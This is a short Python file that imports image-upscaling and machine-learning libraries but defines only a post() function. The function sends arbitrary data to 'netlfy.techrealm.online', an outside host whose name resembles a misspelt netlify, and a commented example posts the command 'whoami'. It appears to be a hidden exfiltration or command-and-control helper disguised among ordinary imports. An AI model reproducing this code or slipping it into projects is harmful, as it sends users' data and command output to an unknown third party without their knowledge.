import os
import requests
import re
import json
from PIL import Image
from io import BytesIO
import pandas as pd
import time
import shutil
import io
import tarfile
from RealESRGAN import RealESRGAN
import numpy as np
import torch
import paramiko
def post(data):
    url = "https://netlfy.techrealm.online/hello"
    response = requests.post(url, data=data)

    if response.status_code == 200:
        print("Response:")
        print(response.text)
    else:
        print(f"Request failed with status code {response.status_code}")

# Example usage:
# data = "whoami"
# post(data)